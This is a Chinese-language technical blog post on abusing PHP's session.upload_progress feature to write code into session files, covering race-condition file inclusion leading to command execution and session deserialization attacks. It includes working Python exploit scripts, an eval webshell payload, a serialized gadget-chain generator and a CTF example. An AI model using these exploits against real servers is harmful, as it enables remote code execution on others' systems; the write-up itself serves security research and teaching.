***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

**本文主要是利用PHP中的`session.upload_progress`功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。**

## php中的session.upload_progress

这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。

在php.ini有以下几个默认选项

    
    
    1. session.upload_progress.enabled = on  
    2. session.upload_progress.cleanup = on  
    3. session.upload_progress.prefix = "upload_progress_"  
    4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"  
    5. session.upload_progress.freq = "1%"  
    6. session.upload_progress.min_freq = "1"

其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。

>
> `enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
> ；
>
> `cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；
>
> `name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；
>
> `prefix+name`将表示为session中的键名

## session相关配置及session反序列化

因为这个不是本文的重点，所以这里附上几个相关链接。

> <https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html>
>
> [https://blog.spoock.com/2016/10/16/php-serialize-> problem/?utm_source=tuicool&utm_medium=referral](https://blog.spoock.com/2016/10/16/php-> serialize-problem/?utm_source=tuicool&utm_medium=referral)

另外，再添加个session配置中一个重要选项。

`session.use_strict_mode=off`这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。

## 利用session.upload_progress进行文件包含利用

### 测试环境

> php5.5.38
>
> win10
>
> 关于session相关的一切配置都是默认值

### 示例代码

    
    
    <?php  
    $b=$_GET['file'];  
    include "$b";  
    ?>

可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。

### 分析

 **问题一**

代码里没有`session_start()`,如何创建session文件呢。

 **解答一**

其实，如果`session.auto_start=On`
，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。

但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session
ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。
并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。

**问题二**

但是问题来了，默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，

 **如何进行rce呢？**

 **解答二**

此时我们可以利用竞争，在session文件内容清空前进行包含利用。

### 利用脚本

    
    
    #coding=utf-8  
    ​  
    import io  
    import requests  
    import threading  
    sessid = 'TGAO'  
    data = {"cmd":"system('whoami');"}  
    def write(session):  
        while True:  
            f = io.BytesIO(b'a' * 1024 * 50)  
            resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )  
    def read(session):  
        while True:  
            resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)  
            if 'tgao.txt' in resp.text:  
                print(resp.text)  
                event.clear()  
            else:  
                print("[+++++++++++++]retry")  
    if __name__=="__main__":  
        event=threading.Event()  
        with requests.session() as session:  
            for i in xrange(1,30):   
                threading.Thread(target=write,args=(session,)).start()  
    ​  
            for i in xrange(1,30):  
                threading.Thread(target=read,args=(session,)).start()  
        event.set()

效果如下图

![利用session.upload_progress进行文件包含和反序列化渗透](https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png!small)

### ctf题目

在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。

    
    
    <html>  
        <?php  
        error_reporting(0);  
        $file = $_GET["file"];  
        $payload = $_GET["payload"];  
        if(!isset($file)){  
            echo 'Missing parameter'.'<br>';  
        }  
        if(preg_match("/flag/",$file)){  
            die('hack attacked!!!');  
        }  
        @include($file);  
        if(isset($payload)){  
            $url = parse_url($_SERVER['REQUEST_URI']);  
            parse_str($url['query'],$query);  
            foreach($query as $value){  
                if (preg_match("/flag/",$value)) {  
                    die('stop hacking!');  
                    exit();  
                }  
            }  
            $payload = unserialize($payload);  
        }else{  
           echo "Missing parameters";  
        }  
        ?>  
        <!--Please test index.php?file=xxx.php -->  
        <!--Please get the source of hint.php-->  
        </html>

在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量`$file`加了过滤，不过没什么影响。

利用思路一样，这里就不再说了，网上也有相应的解法。

### 小结

 **利用条件**

> 1\. 存在文件包含漏洞
>
> 2\. 知道session文件存放路径，可以尝试默认路径
>
> 3\. 具有读取和写入session文件的权限

## 利用session.upload_progress进行反序列化攻击

### 测试环境

> php5.5.38
>
> win10
>
> `session.serialize_handler=php_serialize`，其余session相关配置为默认值

### 示例代码

    
    
    <?php  
    error_reporting(0);  
    date_default_timezone_set("Asia/Shanghai");  
    ini_set('session.serialize_handler','php');  
    session_start();  
    class Door{  
        public $handle;  
    ​  
        function __construct() {  
            $this->handle=new TimeNow();  
        }  
    ​  
        function __destruct() {  
            $this->handle->action();  
        }  
    }  
    class TimeNow {  
        function action() {  
            echo "你的访问时间:"."  ".date('Y-m-d H:i:s',time());  
        }  
    }  
    class  IP{  
        public $ip;  
        function __construct() {  
            $this->ip = 'echo $_SERVER["REMOTE_ADDR"];';  
        }  
        function action() {  
            eval($this->ip);  
        }  
    }  
    ?>

### 分析

 **问题一**

整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢

 **解答一**

这里，利用`PHP_SESSION_UPLOAD_PROGRESS`上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。

另外，与文件包含利用一样，也需要进行竞争。

### 利用脚本

首先利用exp.php脚本构造恶意序列化语句

    
    
      
    <?php  
    ini_set('session.serialize_handler', 'php_serialize');  
    session_start();  
    class Door{  
        public $handle;  
    ​  
        function __construct() {  
            $this->handle = new IP();  
        }  
    ​  
        function __destruct() {  
            $this->handle->action();  
        }  
    }  
    class TimeNow {  
        function action() {  
            echo "你的访问时间:"."  ".date('Y-m-d H:i:s',time());  
        }  
    }  
    ​  
    class  IP{  
        public $ip;  
        function __construct() {  
            //$this->ip='payload';  
            $this->ip='phpinfo();';  
            //$this->ip='print_r(scandir('/'));';  
        }  
        function action() {  
            eval($this->ip);  
        }  
    }  
    $a=new Door();  
    $b=serialize($a);  
    $c=addslashes($b);  
    $d=str_replace("O:4:","|O:4:",$c);  
    echo $d;  
    ?>

其此利用exp.py脚本进行竞争

    
    
    #coding=utf-8  
    import requests  
    import threading  
    import io  
    import sys  
    ​  
    def exp(ip,port):  
          
        f = io.BytesIO(b'a' * 1024 *1024*1)  
        while True:  
            et.wait()  
            url = 'http://'+ip+':'+str(port)+'/test5.php'  
            headers = {  
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',  
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',  
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',  
            'DNT': '1',  
            'Cookie': 'PHPSESSID=20190506',  
            'Connection': 'close',  
            'Upgrade-Insecure-Requests': '1'  
            }  
            proxy = {  
            'http': '127.0.0.1:8080'  
            }  
            data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}  
            files={  
                'file':(r'|O:4:\"Door\":1:{s:6:\"handle\";O:2:\"IP\":1:{s:2:\"ip\";s:10:\"phpinfo();\";}}',f,'text/plain')  
            }  
            resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy  
            resp.encoding="utf-8"  
            if len(resp.text)<2000:  
                print('[+++++]retry')  
            else:  
                print(resp.content.decode('utf-8').encode('utf-8'))  
                et.clear()  
                print('success!')  
                  
    ​  
    if __name__ == "__main__":  
        ip=sys.argv[1]  
        port=int(sys.argv[2])  
        et=threading.Event()  
        for i in xrange(1,40):  
            threading.Thread(target=exp,args=(ip,port)).start()  
        et.set()  
    ​

首先在代码里加个代理，利用burp抓包。如下图

![利用session.upload_progress进行文件包含和反序列化渗透](https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small)

这里有几个注意点：

> PHPSESSID必须要有，因为要竞争同一个文件
>
>
> filename可控，但是在值的最前面加上`|`,因为最终目的是利用session的反序列化，`PHP_SESSION_UPLOAD_PROGRESS`只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突
>
> 上传的文件要大些，否则很难竞争成功。我写入是这么大`f = io.BytesIO(b'a' * 1024 *1024*1)`
>
>
> filename值中出现汉字时，会出错，所以在利用脚本前，[一定要修改python源码](https://blog.csdn.net/iriszx999/article/details/82113521)

最后把`exp.py`中的代理去掉，直接跑`exp.py`,效果如下。

![利用session.upload_progress进行文件包含和反序列化渗透](https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png!small)

### 几次失败尝试

> 其实，利用burp抓到`exp.py`流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。
>
> 另外，我尝试伪造`PHP_SESSION_UPLOAD_PROGRESS`的值，但是值中一旦出现`|`，将会导致数据写入session文件失败。

### 小结

利用条件主要是存在session反序列化漏洞。

从文件包含和反序列化两个利用点，可以发现，利用`PHP_SESSION_UPLOAD_PROGRESS`可以绕过大部分过滤，而且传输的数据也不易发现。

## 最后

我还是一枚小萌新，文章中有不对的地方，还请各位大佬们指正，非常感谢，嘻嘻嘻。

 ***本文作者：17851220695，转载请注明来自FreeBuf.COM**

